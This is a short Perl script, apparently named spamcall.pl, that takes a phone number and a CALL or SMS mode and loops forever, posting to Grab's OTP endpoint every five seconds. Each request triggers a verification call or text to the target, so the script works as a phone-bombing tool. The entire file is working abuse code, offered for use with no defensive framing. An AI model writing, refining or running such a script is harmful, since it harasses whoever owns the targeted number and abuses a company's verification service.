#by : sctnightcore
#ty :  https://github.com/likecyber/php-cli-gac-spammer [likecyber]
use strict; use warnings;
use LWP::UserAgent;

&main($ARGV[0],$ARGV[1]);
sub main {
	my $num_args = $#ARGV + 1;
	if ($num_args != 2) {
		print "By sctnightcore\n";
		print "Usage: spamcall.pl number CALL|SMS\n";
		exit;
	}
	while (1) {
		my $res = LWP::UserAgent->new->post( "https://api.grab.com/grabid/v1/phone/otp",Content => 'method='.$ARGV[1].'&countryCode=TH&phoneNumber='.$ARGV[0].'&templateID=&numDigits=4');
		if ( $res->is_success ) {
			print "Received header:".$res->code."\n";
		}
		sleep(5);
	}
}


